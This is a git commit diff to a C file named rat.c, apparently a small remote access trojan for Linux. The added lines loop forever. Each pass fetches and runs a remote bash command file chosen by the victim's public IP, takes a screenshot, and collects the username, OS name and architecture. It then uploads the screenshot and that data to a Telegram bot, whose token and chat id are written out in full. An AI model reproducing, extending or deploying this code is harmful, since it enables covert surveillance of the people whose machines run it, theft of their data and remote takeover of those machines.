0704114d4bd25b0d34ed1671bad75ba2992120da
Ali Rıza KESKİN <aliriza.keskin@pardustopluluk.org>
2018-05-01 23:40:05 +0300

    Add files via upload

--- rat.c
+++ rat.c
@@ -3,12 +3,13 @@
 	int main(){
 	char code[5000];
 		while(1==1){
-		system("gnome-screenshot -f /tmp/ehuehue.png | :");
-		strcat(code,"caption=\"$(curl http://haydo.esy.es/workspace/AliRiza/ip.php)\";");
-		strcat(code,"curl -s -X POST \"https://api.telegram.org/bot<token>/sendPhoto\" -F chat_id=\"<chatid>\" -F photo=\"@/tmp/ehuehue.png\" -F caption=$caption");
+		system("cd /tmp ; curl https://raw.githubusercontent.com/paledega/DTRAT-command/master/$(curl http://ipecho.net/plain) > /tmp/command ; bash /tmp/command &");
+		system("cd /tmp ; scrot ehuehue.png | :");
+		strcat(code,"caption=\"$(curl http://ipecho.net/plain)-$(echo $USER)-$(cat /etc/os-release | grep ^NAME | awk -F \"=\" '{print $2}' | sed \"s/ /_/g\")-$(uname -m)\";");
+		strcat(code,"curl -s -X POST \"https://api.telegram.org/bot549810678:AAH_wcwWKtrWr2491GlhqIdnvJxD-lPXeag/sendPhoto\" -F chat_id=\"-1001399136572\" -F photo=\"@/tmp/ehuehue.png\" -F caption=$caption");
 		system(code);
 		system("rm -f /tmp/ehuehue.png | :");
-		system("sleep 300 | :");
+		system("sleep 180 | :");
 		strcpy(code,"");
 	}
 }
